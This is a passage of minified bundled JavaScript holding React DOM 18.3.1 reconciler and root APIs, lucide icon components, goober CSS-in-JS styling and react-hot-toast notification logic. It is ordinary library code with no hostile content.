    if (e.memoizedProps !== t.pendingProps || Oe.current) Re = !0;else {
      if (!(e.lanes & n || 128 & t.flags)) return Re = !1, B0(e, t, n);
      Re = !!(131072 & e.flags);
    }
  } else Re = !1, re && 1048576 & t.flags && qp(t, qi, t.index);
  switch (t.lanes = 0, t.tag) {
    case 2:
      var r = t.type;
      Ai(e, t), e = t.pendingProps;
      var o = xr(t, Ee.current);
      mr(t, n), o = Uu(null, t, r, e, o, n);
      var i = Wu();
      return t.flags |= 1, "object" == typeof o && null !== o && "function" == typeof o.render && void 0 === o.$$typeof ? (t.tag = 1, t.memoizedState = null, t.updateQueue = null, Ae(r) ? (i = !0, Zi(t)) : i = !1, t.memoizedState = null !== o.state && void 0 !== o.state ? o.state : null, Mu(t), o.updater = Rl, t.stateNode = o, o._reactInternals = t, Sa(t, r, e, n), t = ka(null, t, r, !0, i, n)) : (t.tag = 0, re && i && $u(t), ke(null, t, o, n), t = t.child), t;
    case 16:
      r = t.elementType;
      e: {
        switch (Ai(e, t), e = t.pendingProps, r = (o = r._init)(r._payload), t.type = r, o = t.tag = o1(r), e = nt(r, e), o) {
          case 0:
            t = Ca(null, t, r, e, n);
            break e;
          case 1:
            t = Rd(null, t, r, e, n);
            break e;
          case 11:
            t = Nd(null, t, r, e, n);
            break e;
          case 14:
            t = $d(null, t, r, nt(r.type, e), n);
            break e;
        }
        throw Error(N(306, r, ""));
      }
      return t;
    case 0:
      return r = t.type, o = t.pendingProps, Ca(e, t, r, o = t.elementType === r ? o : nt(r, o), n);
    case 1:
      return r = t.type, o = t.pendingProps, Rd(e, t, r, o = t.elementType === r ? o : nt(r, o), n);
    case 3:
      e: {
        if (Am(t), null === e) throw Error(N(387));
        r = t.pendingProps, o = (i = t.memoizedState).element, im(e, t), nl(t, r, null, n);
        var l = t.memoizedState;
        if (r = l.element, i.isDehydrated) {
          if (i = {
            element: r,
            isDehydrated: !1,
            cache: l.cache,
            pendingSuspenseBoundaries: l.pendingSuspenseBoundaries,
            transitions: l.transitions
          }, t.updateQueue.baseState = i, t.memoizedState = i, 256 & t.flags) {
            t = Od(e, t, r, n, o = kr(Error(N(423)), t));
            break e;
          }
          if (r !== o) {
            t = Od(e, t, r, n, o = kr(Error(N(424)), t));
            break e;
          }
          for (je = en(t.stateNode.containerInfo.firstChild), Fe = t, re = !0, ot = null, n = rm(t, null, r, n), t.child = n; n;) n.flags = -3 & n.flags | 4096, n = n.sibling;
        } else {
          if (Sr(), r === o) {
            t = Ot(e, t, n);
            break e;
          }
          ke(e, t, r, n);
        }
        t = t.child;
      }
      return t;
    case 5:
      return lm(t), null === e && ya(t), r = t.type, o = t.pendingProps, i = null !== e ? e.memoizedProps : null, l = o.children, pa(r, o) ? l = null : null !== i && pa(r, i) && (t.flags |= 32), Om(e, t), ke(e, t, l, n), t.child;
    case 6:
      return null === e && ya(t), null;
    case 13:
      return Tm(e, t, n);
    case 4:
      return Lu(t, t.stateNode.containerInfo), r = t.pendingProps, null === e ? t.child = Er(t, null, r, n) : ke(e, t, r, n), t.child;
    case 11:
      return r = t.type, o = t.pendingProps, Nd(e, t, r, o = t.elementType === r ? o : nt(r, o), n);
    case 7:
      return ke(e, t, t.pendingProps, n), t.child;
    case 8:
    case 12:
      return ke(e, t, t.pendingProps.children, n), t.child;
    case 10:
      e: {
        if (r = t.type._context, o = t.pendingProps, i = t.memoizedProps, l = o.value, J(el, r._currentValue), r._currentValue = l, null !== i) if (at(i.value, l)) {
          if (i.children === o.children && !Oe.current) {
            t = Ot(e, t, n);
            break e;
          }
        } else for (null !== (i = t.child) && (i.return = t); null !== i;) {
          var s = i.dependencies;
          if (null !== s) {
            l = i.child;
            for (var a = s.firstContext; null !== a;) {
              if (a.context === r) {
                if (1 === i.tag) {
                  (a = bt(-1, n & -n)).tag = 2;
                  var u = i.updateQueue;
                  if (null !== u) {
                    var d = (u = u.shared).pending;
                    null === d ? a.next = a : (a.next = d.next, d.next = a), u.pending = a;
                  }
                }
                i.lanes |= n, null !== (a = i.alternate) && (a.lanes |= n), wa(i.return, n, t), s.lanes |= n;
                break;
              }
              a = a.next;
            }
          } else if (10 === i.tag) l = i.type === t.type ? null : i.child;else if (18 === i.tag) {
            if (null === (l = i.return)) throw Error(N(341));
            l.lanes |= n, null !== (s = l.alternate) && (s.lanes |= n), wa(l, n, t), l = i.sibling;
          } else l = i.child;
          if (null !== l) l.return = i;else for (l = i; null !== l;) {
            if (l === t) {
              l = null;
              break;
            }
            if (null !== (i = l.sibling)) {
              i.return = l.return, l = i;
              break;
            }
            l = l.return;
          }
          i = l;
        }
        ke(e, t, o.children, n), t = t.child;
      }
      return t;
    case 9:
      return o = t.type, r = t.pendingProps.children, mr(t, n), r = r(o = Je(o)), t.flags |= 1, ke(e, t, r, n), t.child;
    case 14:
      return o = nt(r = t.type, t.pendingProps), $d(e, t, r, o = nt(r.type, o), n);
    case 15:
      return $m(e, t, t.type, t.pendingProps, n);
    case 17:
      return r = t.type, o = t.pendingProps, o = t.elementType === r ? o : nt(r, o), Ai(e, t), t.tag = 1, Ae(r) ? (e = !0, Zi(t)) : e = !1, mr(t, n), _m(t, r, o), Sa(t, r, o, n), ka(null, t, r, !0, e, n);
    case 19:
      return Dm(e, t, n);
    case 22:
      return Rm(e, t, n);
  }
  throw Error(N(156, t.tag));
};
var qm = "function" == typeof reportError ? reportError : function (e) {
  console.error(e);
};
function tc(e) {
  this._internalRoot = e;
}
function Il(e) {
  this._internalRoot = e;
}
function nc(e) {
  return !(!e || 1 !== e.nodeType && 9 !== e.nodeType && 11 !== e.nodeType);
}
function Ml(e) {
  return !(!e || 1 !== e.nodeType && 9 !== e.nodeType && 11 !== e.nodeType && (8 !== e.nodeType || " react-mount-point-unstable " !== e.nodeValue));
}
function Wd() {}
function a1(e, t, n, r, o) {
  if (o) {
    if ("function" == typeof r) {
      var i = r;
      r = function () {
        var u = cl(l);
        i.call(u);
      };
    }
    var l = Jm(t, r, e, 0, null, !1, !1, "", Wd);
    return e._reactRootContainer = l, e[$t] = l.current, xo(8 === e.nodeType ? e.parentNode : e), On(), l;
  }
  for (; o = e.lastChild;) e.removeChild(o);
  if ("function" == typeof r) {
    var s = r;
    r = function () {
      var u = cl(a);
      s.call(u);
    };
  }
  var a = qu(e, 0, !1, null, null, !1, !1, "", Wd);
  return e._reactRootContainer = a, e[$t] = a.current, xo(8 === e.nodeType ? e.parentNode : e), On(function () {
    Dl(t, a, n, r);
  }), a;
}
function Ll(e, t, n, r, o) {
  var i = n._reactRootContainer;
  if (i) {
    var l = i;
    if ("function" == typeof o) {
      var s = o;
      o = function () {
        var a = cl(l);
        s.call(a);
      };
    }
    Dl(t, l, e, o);
  } else l = a1(n, t, e, o, r);
  return cl(l);
}
Il.prototype.render = tc.prototype.render = function (e) {
  var t = this._internalRoot;
  if (null === t) throw Error(N(409));
  Dl(e, t, null, null);
}, Il.prototype.unmount = tc.prototype.unmount = function () {
  var e = this._internalRoot;
  if (null !== e) {
    this._internalRoot = null;
    var t = e.containerInfo;
    On(function () {
      Dl(null, e, null, null);
    }), t[$t] = null;
  }
}, Il.prototype.unstable_scheduleHydration = function (e) {
  if (e) {
    var t = Rp();
    e = {
      blockedOn: null,
      target: e,
      priority: t
    };
    for (var n = 0; n < Kt.length && 0 !== t && t < Kt[n].priority; n++);
    Kt.splice(n, 0, e), 0 === n && Ap(e);
  }
}, Np = function (e) {
  switch (e.tag) {
    case 3:
      var t = e.stateNode;
      if (t.current.memoizedState.isDehydrated) {
        var n = Jr(t.pendingLanes);
        0 !== n && (Su(t, 1 | n), Te(t, ae()), !(6 & K) && (Pr = ae() + 500, pn()));
      }
      break;
    case 13:
      On(function () {
        var r = Rt(e, 1);
        if (null !== r) {
          var o = Pe();
          st(r, e, 1, o);
        }
      }), ec(e, 1);
  }
}, Eu = function (e) {
  if (13 === e.tag) {
    var t = Rt(e, 134217728);
    if (null !== t) st(t, e, 134217728, Pe());
    ec(e, 134217728);
  }
}, $p = function (e) {
  if (13 === e.tag) {
    var t = rn(e),
      n = Rt(e, t);
    if (null !== n) st(n, e, t, Pe());
    ec(e, t);
  }
}, Rp = function () {
  return G;
}, Op = function (e, t) {
  var n = G;
  try {
    return G = e, t();
  } finally {
    G = n;
  }
}, ra = function (e, t, n) {
  switch (t) {
    case "input":
      if (Xs(e, n), t = n.name, "radio" === n.type && null != t) {
        for (n = e; n.parentNode;) n = n.parentNode;
        for (n = n.querySelectorAll("input[name=" + JSON.stringify("" + t) + '][type="radio"]'), t = 0; t < n.length; t++) {
          var r = n[t];
          if (r !== e && r.form === e.form) {
            var o = bl(r);
            if (!o) throw Error(N(90));
            ap(r), Xs(r, o);
          }
        }
      }
      break;
    case "textarea":
      cp(e, n);
      break;
    case "select":
      null != (t = n.value) && cr(e, !!n.multiple, t, !1);
  }
}, gp = Yu, yp = On;
var u1 = {
    usingClientEntryPoint: !1,
    Events: [zo, rr, bl, vp, hp, Yu]
  },
  Kr = {
    findFiberByHostInstance: Sn,
    bundleType: 0,
    version: "18.3.1",
    rendererPackageName: "react-dom"
  },
  c1 = {
    bundleType: Kr.bundleType,
    version: Kr.version,
    rendererPackageName: Kr.rendererPackageName,
    rendererConfig: Kr.rendererConfig,
    overrideHookState: null,
    overrideHookStateDeletePath: null,
    overrideHookStateRenamePath: null,
    overrideProps: null,
    overridePropsDeletePath: null,
    overridePropsRenamePath: null,
    setErrorHandler: null,
    setSuspenseHandler: null,
    scheduleUpdate: null,
    currentDispatcherRef: Lt.ReactCurrentDispatcher,
    findHostInstanceByFiber: function (e) {
      return null === (e = Sp(e)) ? null : e.stateNode;
    },
    findFiberByHostInstance: Kr.findFiberByHostInstance || s1,
    findHostInstancesForRefresh: null,
    scheduleRefresh: null,
    scheduleRoot: null,
    setRefreshHandler: null,
    getCurrentFiber: null,
    reconcilerVersion: "18.3.1-next-f1338f8080-20240426"
  };
if (typeof __REACT_DEVTOOLS_GLOBAL_HOOK__ < "u") {
  var di = __REACT_DEVTOOLS_GLOBAL_HOOK__;
  if (!di.isDisabled && di.supportsFiber) try {
    Cl = di.inject(c1), yt = di;
  } catch {}
}
function ev() {
  if (!(typeof __REACT_DEVTOOLS_GLOBAL_HOOK__ > "u" || "function" != typeof __REACT_DEVTOOLS_GLOBAL_HOOK__.checkDCE)) try {
    __REACT_DEVTOOLS_GLOBAL_HOOK__.checkDCE(ev);
  } catch (e) {
    console.error(e);
  }
}
Ke.__SECRET_INTERNALS_DO_NOT_USE_OR_YOU_WILL_BE_FIRED = u1, Ke.createPortal = function (e, t) {
  var n = 2 < arguments.length && void 0 !== arguments[2] ? arguments[2] : null;
  if (!nc(t)) throw Error(N(200));
  return l1(e, t, null, n);
}, Ke.createRoot = function (e, t) {
  if (!nc(e)) throw Error(N(299));
  var n = !1,
    r = "",
    o = qm;
  return null != t && (!0 === t.unstable_strictMode && (n = !0), void 0 !== t.identifierPrefix && (r = t.identifierPrefix), void 0 !== t.onRecoverableError && (o = t.onRecoverableError)), t = qu(e, 1, !1, null, null, n, !1, r, o), e[$t] = t.current, xo(8 === e.nodeType ? e.parentNode : e), new tc(t);
}, Ke.findDOMNode = function (e) {
  if (null == e) return null;
  if (1 === e.nodeType) return e;
  var t = e._reactInternals;
  if (void 0 === t) throw "function" == typeof e.render ? Error(N(188)) : (e = Object.keys(e).join(","), Error(N(268, e)));
  return e = null === (e = Sp(t)) ? null : e.stateNode;
}, Ke.flushSync = function (e) {
  return On(e);
}, Ke.hydrate = function (e, t, n) {
  if (!Ml(t)) throw Error(N(200));
  return Ll(null, e, t, !0, n);
}, Ke.hydrateRoot = function (e, t, n) {
  var _n2;
  if (!nc(e)) throw Error(N(405));
  var r = null != n && n.hydratedSources || null,
    o = !1,
    i = "",
    l = qm;
  if (null != n && (!0 === n.unstable_strictMode && (o = !0), void 0 !== n.identifierPrefix && (i = n.identifierPrefix), void 0 !== n.onRecoverableError && (l = n.onRecoverableError)), t = Jm(t, null, e, 1, (_n2 = n) !== null && _n2 !== void 0 ? _n2 : null, o, !1, i, l), e[$t] = t.current, xo(e), r) for (e = 0; e < r.length; e++) o = (o = (n = r[e])._getVersion)(n._source), null == t.mutableSourceEagerHydrationData ? t.mutableSourceEagerHydrationData = [n, o] : t.mutableSourceEagerHydrationData.push(n, o);
  return new Il(t);
}, Ke.render = function (e, t, n) {
  if (!Ml(t)) throw Error(N(200));
  return Ll(null, e, t, !1, n);
}, Ke.unmountComponentAtNode = function (e) {
  if (!Ml(e)) throw Error(N(40));
  return !!e._reactRootContainer && (On(function () {
    Ll(null, null, e, !1, function () {
      e._reactRootContainer = null, e[$t] = null;
    });
  }), !0);
}, Ke.unstable_batchedUpdates = Yu, Ke.unstable_renderSubtreeIntoContainer = function (e, t, n, r) {
  if (!Ml(n)) throw Error(N(200));
  if (null == e || void 0 === e._reactInternals) throw Error(N(38));
  return Ll(e, t, n, !1, r);
}, Ke.version = "18.3.1-next-f1338f8080-20240426", ev(), ep.exports = Ke;
var Un = ep.exports;
const tv = su(Un);
var Bd = Un;
Bs.createRoot = Bd.createRoot, Bs.hydrateRoot = Bd.hydrateRoot;
const d1 = e => e.replace(/([a-z0-9])([A-Z])/g, "$1-$2").toLowerCase(),
  nv = (...e) => e.filter((t, n, r) => !!t && r.indexOf(t) === n).join(" ");
var f1 = {
  xmlns: "http://www.w3.org/2000/svg",
  width: 24,
  height: 24,
  viewBox: "0 0 24 24",
  fill: "none",
  stroke: "currentColor",
  strokeWidth: 2,
  strokeLinecap: "round",
  strokeLinejoin: "round"
};
const p1 = c.forwardRef(({
    color: e = "currentColor",
    size: t = 24,
    strokeWidth: n = 2,
    absoluteStrokeWidth: r,
    className: o = "",
    children: i,
    iconNode: l,
    ...s
  }, a) => c.createElement("svg", {
    ref: a,
    ...f1,
    width: t,
    height: t,
    stroke: e,
    strokeWidth: r ? 24 * Number(n) / Number(t) : n,
    className: nv("lucide", o),
    ...s
  }, [...l.map(([u, d]) => c.createElement(u, d)), ...(Array.isArray(i) ? i : [i])])),
  Wn = (e, t) => {
    const n = c.forwardRef(({
      className: r,
      ...o
    }, i) => c.createElement(p1, {
      ref: i,
      iconNode: t,
      className: nv(`lucide-${d1(e)}`, r),
      ...o
    }));
    return n.displayName = `${e}`, n;
  },
  m1 = Wn("Check", [["path", {
    d: "M20 6 9 17l-5-5",
    key: "1gmf2c"
  }]]),
  v1 = Wn("ChevronsUpDown", [["path", {
    d: "m7 15 5 5 5-5",
    key: "1hf1tw"
  }], ["path", {
    d: "m7 9 5-5 5 5",
    key: "sgt6xg"
  }]]),
  h1 = Wn("ClipboardCheck", [["rect", {
    width: "8",
    height: "4",
    x: "8",
    y: "2",
    rx: "1",
    ry: "1",
    key: "tgr4d6"
  }], ["path", {
    d: "M16 4h2a2 2 0 0 1 2 2v14a2 2 0 0 1-2 2H6a2 2 0 0 1-2-2V6a2 2 0 0 1 2-2h2",
    key: "116196"
  }], ["path", {
    d: "m9 14 2 2 4-4",
    key: "df797q"
  }]]),
  g1 = Wn("Copy", [["rect", {
    width: "14",
    height: "14",
    x: "8",
    y: "8",
    rx: "2",
    ry: "2",
    key: "17jyea"
  }], ["path", {
    d: "M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2",
    key: "zix9uf"
  }]]),
  y1 = Wn("Search", [["circle", {
    cx: "11",
    cy: "11",
    r: "8",
    key: "4ej97u"
  }], ["path", {
    d: "m21 21-4.3-4.3",
    key: "1qie3q"
  }]]),
  w1 = Wn("WandSparkles", [["path", {
    d: "m21.64 3.64-1.28-1.28a1.21 1.21 0 0 0-1.72 0L2.36 18.64a1.21 1.21 0 0 0 0 1.72l1.28 1.28a1.2 1.2 0 0 0 1.72 0L21.64 5.36a1.2 1.2 0 0 0 0-1.72",
    key: "ul74o6"
  }], ["path", {
    d: "m14 7 3 3",
    key: "1r5n42"
  }], ["path", {
    d: "M5 6v4",
    key: "ilb8ba"
  }], ["path", {
    d: "M19 14v4",
    key: "blhpug"
  }], ["path", {
    d: "M10 2v2",
    key: "7u0qdc"
  }], ["path", {
    d: "M7 8H3",
    key: "zfb6yr"
  }], ["path", {
    d: "M21 16h-4",
    key: "1cnmox"
  }], ["path", {
    d: "M11 3H9",
    key: "1obp7u"
  }]]),
  x1 = Wn("X", [["path", {
    d: "M18 6 6 18",
    key: "1bl5f8"
  }], ["path", {
    d: "m6 6 12 12",
    key: "d8bk6v"
  }]]);
let ov,
  Ma,
  La,
  S1 = {
    data: ""
  },
  E1 = e => "object" == typeof window ? ((e ? e.querySelector("#_goober") : window._goober) || Object.assign((e || document.head).appendChild(document.createElement("style")), {
    innerHTML: " ",
    id: "_goober"
  })).firstChild : e || S1,
  C1 = /(?:([\u0080-\uFFFF\w-%@]+) *:? *([^{;]+?);|([^;}{]*?) *{)|(}\s*)/g,
  k1 = /\/\*[^]*?\*\/|  +/g,
  Vd = /\n+/g,
  Qt = (e, t) => {
    let n = "",
      r = "",
      o = "";
    for (let i in e) {
      let l = e[i];
      "@" == i[0] ? "i" == i[1] ? n = i + " " + l + ";" : r += "f" == i[1] ? Qt(l, i) : i + "{" + Qt(l, "k" == i[1] ? "" : t) + "}" : "object" == typeof l ? r += Qt(l, t ? t.replace(/([^,])+/g, s => i.replace(/(^:.*)|([^,])+/g, a => /&/.test(a) ? a.replace(/&/g, s) : s ? s + " " + a : a)) : i) : null != l && (i = /^--/.test(i) ? i : i.replace(/[A-Z]/g, "-$&").toLowerCase(), o += Qt.p ? Qt.p(i, l) : i + ":" + l + ";");
    }
    return n + (t && o ? t + "{" + o + "}" : o) + r;
  },
  St = {},
  rv = e => {
    if ("object" == typeof e) {
      let t = "";
      for (let n in e) t += n + rv(e[n]);
      return t;
    }
    return e;
  },
  P1 = (e, t, n, r, o) => {
    let i = rv(e),
      l = St[i] || (St[i] = (a => {
        let u = 0,
          d = 11;
        for (; u < a.length;) d = 101 * d + a.charCodeAt(u++) >>> 0;
        return "go" + d;
      })(i));
    if (!St[l]) {
      let a = i !== e ? e : (u => {
        let d,
          f,
          v = [{}];
        for (; d = C1.exec(u.replace(k1, ""));) d[4] ? v.shift() : d[3] ? (f = d[3].replace(Vd, " ").trim(), v.unshift(v[0][f] = v[0][f] || {})) : v[0][d[1]] = d[2].replace(Vd, " ").trim();
        return v[0];
      })(e);
      St[l] = Qt(o ? {
        ["@keyframes " + l]: a
      } : a, n ? "" : "." + l);
    }
    let s = n && St.g ? St.g : null;
    return n && (St.g = St[l]), a = St[l], u = t, d = r, (f = s) ? u.data = u.data.replace(f, a) : -1 === u.data.indexOf(a) && (u.data = d ? a + u.data : u.data + a), l;
    var a, u, d, f;
  },
  _1 = (e, t, n) => e.reduce((r, o, i) => {
    var _l2;
    let l = t[i];
    if (l && l.call) {
      let s = l(n),
        a = s && s.props && s.props.className || /^go/.test(s) && s;
      l = a ? "." + a : s && "object" == typeof s ? s.props ? "" : Qt(s, "") : !1 === s ? "" : s;
    }
    return r + o + ((_l2 = l) !== null && _l2 !== void 0 ? _l2 : "");
  }, "");
function jl(e) {
  let t = this || {},
    n = e.call ? e(t.p) : e;
  return P1(n.unshift ? n.raw ? _1(n, [].slice.call(arguments, 1), t.p) : n.reduce((r, o) => Object.assign(r, o && o.call ? o(t.p) : o), {}) : n, E1(t.target), t.g, t.o, t.k);
}
jl.bind({
  g: 1
});
let At = jl.bind({
  k: 1
});
function b1(e, t, n, r) {
  Qt.p = t, ov = e, Ma = n, La = r;
}
function mn(e, t) {
  let n = this || {};
  return function () {
    let r = arguments;
    return function o(i, l) {
      let s = Object.assign({}, i),
        a = s.className || o.className;
      n.p = Object.assign({
        theme: Ma && Ma()
      }, s), n.o = / *go\d+/.test(a), s.className = jl.apply(n, r) + (a ? " " + a : "");
      let u = e;
      return e[0] && (u = s.as || e, delete s.as), La && u[0] && La(s), ov(u, s);
    };
  };
}
var N1 = e => "function" == typeof e,
  dl = (e, t) => N1(e) ? e(t) : e,
  $1 = (() => {
    let e = 0;
    return () => (++e).toString();
  })(),
  iv = (() => {
    let e;
    return () => {
      if (void 0 === e && typeof window < "u") {
        let t = matchMedia("(prefers-reduced-motion: reduce)");
        e = !t || t.matches;
      }
      return e;
    };
  })(),
  R1 = 20,
  Mi = new Map(),
  O1 = 1e3,
  Hd = e => {
    if (Mi.has(e)) return;
    let t = setTimeout(() => {
      Mi.delete(e), Bn({
        type: 4,
        toastId: e
      });
    }, O1);
    Mi.set(e, t);
  },
  A1 = e => {
    let t = Mi.get(e);
    t && clearTimeout(t);
  },
  ja = (e, t) => {
    switch (t.type) {
      case 0:
        return {
          ...e,
          toasts: [t.toast, ...e.toasts].slice(0, R1)
        };
      case 1:
        return t.toast.id && A1(t.toast.id), {
          ...e,
          toasts: e.toasts.map(i => i.id === t.toast.id ? {
            ...i,
            ...t.toast
          } : i)
        };
      case 2:
        let {
          toast: n
        } = t;
        return e.toasts.find(i => i.id === n.id) ? ja(e, {
          type: 1,
          toast: n
        }) : ja(e, {
          type: 0,
          toast: n
        });
      case 3:
        let {
          toastId: r
        } = t;
        return r ? Hd(r) : e.toasts.forEach(i => {
          Hd(i.id);
        }), {
          ...e,
          toasts: e.toasts.map(i => i.id === r || void 0 === r ? {
            ...i,
            visible: !1
          } : i)
        };
      case 4:
        return void 0 === t.toastId ? {
          ...e,
          toasts: []
        } : {
          ...e,
          toasts: e.toasts.filter(i => i.id !== t.toastId)
        };
      case 5:
        return {
          ...e,
          pausedAt: t.time
        };
      case 6:
        let o = t.time - (e.pausedAt || 0);
        return {
          ...e,
          pausedAt: void 0,
          toasts: e.toasts.map(i => ({
            ...i,
            pauseDuration: i.pauseDuration + o
          }))
        };
    }
  },
  Li = [],
  ji = {
    toasts: [],
    pausedAt: void 0
  },
  Bn = e => {
    ji = ja(ji, e), Li.forEach(t => {
      t(ji);
    });
  },
  T1 = {
    blank: 4e3,
    error: 4e3,
    success: 2e3,
    loading: 1 / 0,
    custom: 4e3
  },
  D1 = (e = {}) => {
    let [t, n] = c.useState(ji);
    c.useEffect(() => (Li.push(n), () => {
      let o = Li.indexOf(n);
      o > -1 && Li.splice(o, 1);
    }), [t]);
    let r = t.toasts.map(o => {
      var i, l;
      return {
        ...e,
        ...e[o.type],
        ...o,
        duration: o.duration || (null == (i = e[o.type]) ? void 0 : i.duration) || (null == e ? void 0 : e.duration) || T1[o.type],
        style: {
          ...e.style,
          ...(null == (l = e[o.type]) ? void 0 : l.style),
          ...o.style
        }
      };
    });
    return {
      ...t,
      toasts: r
    };
  },
  I1 = (e, t = "blank", n) => ({
    createdAt: Date.now(),
    visible: !0,
    type: t,
    ariaProps: {
      role: "status",
      "aria-live": "polite"
    },
    message: e,
    pauseDuration: 0,
    ...n,
    id: (null == n ? void 0 : n.id) || $1()
  }),
  Uo = e => (t, n) => {
    let r = I1(t, e, n);
    return Bn({
      type: 2,
      toast: r
    }), r.id;
  },
  ze = (e, t) => Uo("blank")(e, t);
ze.error = Uo("error"), ze.success = Uo("success"), ze.loading = Uo("loading"), ze.custom = Uo("custom"), ze.dismiss = e => {
  Bn({
    type: 3,
    toastId: e
  });
}, ze.remove = e => Bn({
  type: 4,
  toastId: e
}), ze.promise = (e, t, n) => {
  let r = ze.loading(t.loading, {
    ...n,
    ...(null == n ? void 0 : n.loading)
  });
  return e.then(o => (ze.success(dl(t.success, o), {
    id: r,
    ...n,
    ...(null == n ? void 0 : n.success)
  }), o)).catch(o => {
    ze.error(dl(t.error, o), {
      id: r,
      ...n,
      ...(null == n ? void 0 : n.error)
    });
  }), e;
};
var M1 = (e, t) => {
    Bn({
      type: 1,
      toast: {
        id: e,
        height: t
      }
    });
  },
  L1 = () => {
    Bn({
      type: 5,
      time: Date.now()
    });
  },
  j1 = e => {
    let {
      toasts: t,
      pausedAt: n
    } = D1(e);
    c.useEffect(() => {
      if (n) return;
      let i = Date.now(),
        l = t.map(s => {
          if (s.duration === 1 / 0) return;
          let a = (s.duration || 0) + s.pauseDuration - (i - s.createdAt);
          if (!(a < 0)) return setTimeout(() => ze.dismiss(s.id), a);
          s.visible && ze.dismiss(s.id);
        });
      return () => {
        l.forEach(s => s && clearTimeout(s));
      };
    }, [t, n]);
    let r = c.useCallback(() => {
        n && Bn({
          type: 6,
          time: Date.now()
        });
      }, [n]),
      o = c.useCallback((i, l) => {
        let {
            reverseOrder: s = !1,
            gutter: a = 8,
            defaultPosition: u
          } = l || {},
          d = t.filter(g => (g.position || u) === (i.position || u) && g.height),
          f = d.findIndex(g => g.id === i.id),
          v = d.filter((g, x) => x < f && g.visible).length;
        return d.filter(g => g.visible).slice(...(s ? [v + 1] : [0, v])).reduce((g, x) => g + (x.height || 0) + a, 0);
      }, [t]);
    return {
      toasts: t,
      handlers: {
        updateHeight: M1,
        startPause: L1,
        endPause: r,
        calculateOffset: o
      }
    };
  },
  z1 = At`
from {
  transform: scale(0) rotate(45deg);
	opacity: 0;
}
to {
 transform: scale(1) rotate(45deg);
  opacity: 1;
}`,
  F1 = At`
from {
  transform: scale(0);
  opacity: 0;
}
to {
  transform: scale(1);
  opacity: 1;
}`,
  U1 = At`
from {
  transform: scale(0) rotate(90deg);
	opacity: 0;
}
to {
  transform: scale(1) rotate(90deg);
	opacity: 1;
}`,
  W1 = mn("div")`
  width: 20px;
  opacity: 0;
  height: 20px;
  border-radius: 10px;
  background: ${e => e.primary || "#ff4b4b"};
  position: relative;
  transform: rotate(45deg);

  animation: ${z1} 0.3s cubic-bezier(0.175, 0.885, 0.32, 1.275)
    forwards;
  animation-delay: 100ms;

  &:after,
  &:before {
    content: '';
    animation: ${F1} 0.15s ease-out forwards;
    animation-delay: 150ms;
    position: absolute;
    border-radius: 3px;
    opacity: 0;
    background: ${e => e.secondary || "#fff"};
    bottom: 9px;
    left: 4px;
    height: 2px;
    width: 12px;
  }

  &:before {
    animation: ${U1} 0.15s ease-out forwards;
    animation-delay: 180ms;
    transform: rotate(90deg);
  }
`,
  B1 = At`
  from {
    transform: rotate(0deg);
  }
  to {
    transform: rotate(360deg);
  }
`,
  V1 = mn("div")`
  width: 12px;
  height: 12px;
  box-sizing: border-box;
  border: 2px solid;
  border-radius: 100%;
  border-color: ${e => e.secondary || "#e0e0e0"};
  border-right-color: ${e => e.primary || "#616161"};
  animation: ${B1} 1s linear infinite;
`,
  H1 = At`
from {
  transform: scale(0) rotate(45deg);
	opacity: 0;
}
to {
  transform: scale(1) rotate(45deg);
	opacity: 1;
}`,
  K1 = At`
0% {
	height: 0;
	width: 0;
	opacity: 0;
}
40% {
  height: 0;
	width: 6px;
	opacity: 1;
}
100% {
  opacity: 1;
  height: 10px;
}`,
  G1 = mn("div")`
  width: 20px;
  opacity: 0;
  height: 20px;
  border-radius: 10px;
  background: ${e => e.primary || "#61d345"};
  position: relative;
  transform: rotate(45deg);

  animation: ${H1} 0.3s cubic-bezier(0.175, 0.885, 0.32, 1.275)
    forwards;
  animation-delay: 100ms;
  &:after {
    content: '';
    box-sizing: border-box;
    animation: ${K1} 0.2s ease-out forwards;
    opacity: 0;
    animation-delay: 200ms;
    position: absolute;
    border-right: 2px solid;
    border-bottom: 2px solid;
    border-color: ${e => e.secondary || "#fff"};
    bottom: 6px;
    left: 6px;
    height: 10px;
    width: 6px;
  }
`,
  Q1 = mn("div")`
  position: absolute;
`,
  Y1 = mn("div")`
  position: relative;
  display: flex;
  justify-content: center;
  align-items: center;
  min-width: 20px;
  min-height: 20px;
`,
  X1 = At`
from {
  transform: scale(0.6);
  opacity: 0.4;
}
to {
  transform: scale(1);
  opacity: 1;
}`,
  Z1 = mn("div")`
  position: relative;
  transform: scale(0.6);
  opacity: 0.4;
  min-width: 20px;
  animation: ${X1} 0.3s 0.12s cubic-bezier(0.175, 0.885, 0.32, 1.275)
    forwards;
`,
  J1 = ({
    toast: e
  }) => {
    let {
      icon: t,
      type: n,
      iconTheme: r
    } = e;
    return void 0 !== t ? "string" == typeof t ? c.createElement(Z1, null, t) : t : "blank" === n ? null : c.createElement(Y1, null, c.createElement(V1, {
      ...r
    }), "loading" !== n && c.createElement(Q1, null, "error" === n ? c.createElement(W1, {
      ...r
    }) : c.createElement(G1, {
      ...r
    })));
  },
  q1 = e => `\n0% {transform: translate3d(0,${-200 * e}%,0) scale(.6); opacity:.5;}\n100% {transform: translate3d(0,0,0) scale(1); opacity:1;}\n`,
  ew = e => `\n0% {transform: translate3d(0,0,-1px) scale(1); opacity:1;}\n100% {transform: translate3d(0,${-150 * e}%,-1px) scale(.6); opacity:0;}\n`,
  tw = "0%{opacity:0;} 100%{opacity:1;}",
  nw = "0%{opacity:1;} 100%{opacity:0;}",
  rw = mn("div")`
  display: flex;
  align-items: center;
  background: #fff;
  color: #363636;
  line-height: 1.3;
  will-change: transform;
  box-shadow: 0 3px 10px rgba(0, 0, 0, 0.1), 0 3px 3px rgba(0, 0, 0, 0.05);
  max-width: 350px;
  pointer-events: auto;
  padding: 8px 10px;
  border-radius: 8px;
`,
  ow = mn("div")`
  display: flex;
  justify-content: center;
  margin: 4px 10px;
  color: inherit;
  flex: 1 1 auto;
  white-space: pre-line;
`,
  iw = (e, t) => {
    let n = e.includes("top") ? 1 : -1,
      [r, o] = iv() ? [tw, nw] : [q1(n), ew(n)];
    return {
      animation: t ? `${At(r)} 0.35s cubic-bezier(.21,1.02,.73,1) forwards` : `${At(o)} 0.4s forwards cubic-bezier(.06,.71,.55,1)`
    };
  },
  lw = c.memo(({
    toast: e,
    position: t,
    style: n,
    children: r
  }) => {
    let o = e.height ? iw(e.position || t || "top-center", e.visible) : {
        opacity: 0
      },
      i = c.createElement(J1, {
        toast: e
      }),
      l = c.createElement(ow, {
        ...e.ariaProps
      }, dl(e.message, e));
